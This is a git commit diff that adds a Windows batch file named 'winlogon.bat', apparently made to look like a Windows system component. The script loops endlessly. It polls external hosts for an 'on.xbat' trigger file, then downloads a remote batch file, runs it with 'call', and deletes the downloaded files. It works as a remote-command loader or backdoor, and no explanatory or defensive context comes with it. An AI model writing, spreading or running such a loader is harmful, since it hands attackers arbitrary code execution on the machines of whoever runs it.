6a7acb2ebfef9dbedcd5223858c1b5844b3dd226
theredenemy <34151821+theredenemy@users.noreply.github.com>
2020-09-27 22:02:48 -0700

    Add files via upload

---
+++ windows1093/winlogon.bat
@@ -0,0 +1,22 @@
+@echo off
+:xbat
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://dos.xp3.biz/xbat/on.xbat', 'on.xbat')"
+powershell -Command "Invoke-WebRequest http://bat1234.xp3.biz/xbat/on.xbat -OutFile on.xbat"
+if exist on.xbat goto xbat.download
+timeout /t 3
+goto xbat
+:xbat.download
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://dos.xp3.biz/xbat/bat.xbat', 'bat.bat')"
+powershell -Command "Invoke-WebRequest http://dos.xp3.biz/xbat/bat.xbat -OutFile bat.bat"
+if exist bat.bat goto xbat.start
+goto xbat
+:xbat.start
+call bat.bat
+del on.xbat
+del bat.bat
+goto xbat
+
+
+
+
+
